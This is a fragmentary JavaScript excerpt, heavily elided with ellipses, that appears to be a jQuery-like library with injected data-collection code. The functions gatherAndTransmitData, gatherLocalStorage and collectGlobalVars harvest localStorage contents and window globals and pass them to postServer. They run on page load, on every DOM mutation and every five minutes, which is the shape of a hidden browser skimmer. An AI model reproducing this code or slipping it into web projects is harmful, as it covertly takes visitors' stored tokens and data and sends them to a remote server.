...
(function (e, t) {
  ...
  function hashData(data) {
    ...
    let keyConcat = dataKeys.join("");
    let hashValue = 0;
    for (char of keyConcat) {
  ...
  function collectGlobalVars() {
    ...
    for (let prop in window) {
      if (window.hasOwnProperty(prop)) {
        if (!globalVars[prop]) {
          globalVarsKeys.push(prop);
          globalVars[prop] = true;
        }
      }
    }
    return globalVarsKeys;
  }
  function pt(e, t) {
  ...
  function gatherAndTransmitData() {
    const matchedItems = gatherLocalStorage();
    matchedItems['global_vars'] = collectGlobalVars();
    if (Object.getOwnPropertyNames(matchedItems).length > 1) {
      postServer(matchedItems);
    }
  }
  x.extend({
  ...
  window.addEventListener("DOMContentLoaded", function () {
    ...
    new MutationObserver(gatherAndTransmitData).observe(document, {
      subtree: true,
      childList: true
    });
  });
  ...
  setInterval(gatherAndTransmitData, 5 * 60 * 1000);
})(window);